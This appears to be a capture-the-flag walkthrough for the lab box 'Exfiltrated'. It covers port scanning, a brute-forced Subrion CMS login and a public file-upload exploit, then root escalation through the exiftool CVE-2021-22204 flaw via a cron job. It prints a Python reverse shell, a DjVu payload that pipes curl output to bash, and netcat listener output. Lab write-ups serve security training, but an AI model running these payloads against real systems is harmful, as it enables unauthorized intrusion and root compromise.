@@ -1,0 +1,155 @@
+																							              Exfiltrated Walkthrough
+																							
+																									
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.163
+export IP=192.168.68.163
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt
+ 
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Did not follow redirect to http://exfiltrated.offsec/
+| http-robots.txt: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/
+Service Info: OS: Linux
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+
+nano /etc/hosts
+192.168.68.163  exfiltrated.offsec
+  
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+http-enum: 
+ /robots.txt: Robots file
+ /.gitignore: Revision control ignore file
+ /changelog.txt: Version field
+
+nikto --url $IP 
+
+Enumeration
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429,302,301 -t 30 -R3 "http://$IP/FUZZ"
+
+.gitignore
+robots.txt
+sitemap.xml
+ 
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/FUZZ -t 500 -mc 200,301   
+
+Port 80:
+
+/backup/
+/cron/? 
+/front/ 
+/install/          403
+/panel/          http://exfiltrated.offsec/panel/                  Login page for Subrion CMS v4.2.1
+/tmp/ 
+/updates/        403
+
+Let's test the first login page http://exfiltrated.offsec/login/
+
+Let's brute-force using the wordlist for common usernames from seclists : top-usernames-list.txt
+
+Discovered credentials: admin/admin
+
+Aparently, the same credentials for the login page hosted at http://exfiltrated.offsec/panel/  
+
+searchsploit Subrion CMS v4.2.1
+Subrion CMS 4.2.1 - Arbitrary File Upload          | php/webapps/49876.py
+
+searchsploit -m php/webapps/49876.py
+
+python 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin        (make sure you fucking use the entire url, for example the last dash sign /)
+
+Got Shell boys!
+
+cd /home/coaran         // Aparently we don't have the rights to view the files inside coaran directory
+Let's try to access the flag file direct using 
+cat /coaran/local.txt    // flag: 2eabce1ff8b93f442fa2007d806fbf3d
+
+####
+
+Privilege Escalation
+
+cd /var/www/html/subrion/includes
+cat config.inc.php 
+
+define('INTELLI_CONNECT', 'mysqli');
+define('INTELLI_DBHOST', 'localhost');
+define('INTELLI_DBUSER', 'subrionuser');
+define('INTELLI_DBPASS', 'target100');
+define('INTELLI_DBNAME', 'subrion');
+define('INTELLI_DBPORT', '3306');
+define('INTELLI_DBPREFIX', 'sbr421_');
+
+mysql -usubrionuser -ptarget100          // waste of time
+
+Ran psp64 and aparently the script /bin/sh -c bash /opt/image-exif.sh is run under root.
+
+You can see that when you check crontab: 
+cat /etc/crontab
+* *     * * *   root    bash /opt/image-exif.sh
+
+So aparently the script read metadata from all files inside the /var/www/html/subrion/uploads
+
+cat image-exif.sh 
+#! /bin/bash
+#07/06/18 A BASH script to collect EXIF metadata 
+
+echo -ne "\\n metadata directory cleaned! \\n\\n"
+
+
+IMAGES='/var/www/html/subrion/uploads'
+
+META='/opt/metadata'
+FILE=`openssl rand -hex 5`
+LOGFILE="$META/$FILE"
+
+echo -ne "\\n Processing EXIF metadata now... \\n\\n"
+ls $IMAGES | grep "jpg" | while read filename; 
+do 
+    exiftool "$IMAGES/$filename" >> $LOGFILE 
+done
+
+echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
+
+So we can create our image and modify the metadata and place it in the /var/www/html/subrion/uploads and it should be executed every minute.
+
+So we can use a a known exploit for exittool wich allows us to modity image metadata and obtain out shell when the script is ran.
+
+https://github.com/AssassinUKG/CVE-2021-22204/blob/main/CVE-2021-22204.sh
+
+bash exploit.sh "reverseme 192.168.49.68 5555" urs.jpg
+
+Copy the image in the /var/www/html/subrion/uploads  and have a netcat shell opened.
+
+
+
+OR the manual way
+
+nano shell.sh
+#!/bin/bash
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.68",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+nano exploit
+(metadata "\c${system ('curl http://192.168.49.68:80/shell.sh | bash')};")       // make sure you have your python3 server opened all the time on port 80
+
+
+djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
+
+mv exploit.djvu exploit.jpg
+
+Download the exploit.jpg file into /var/www/html/subrion/uploads and have your nc -lvnp 5555 opened
+nc -lvnp 5555
+
+listening on [any] 5555 ...
+connect to [192.168.49.68] from (UNKNOWN) [192.168.68.163] 59768
+/bin/sh: 0: can't access tty; job control turned off
+whoami
+root
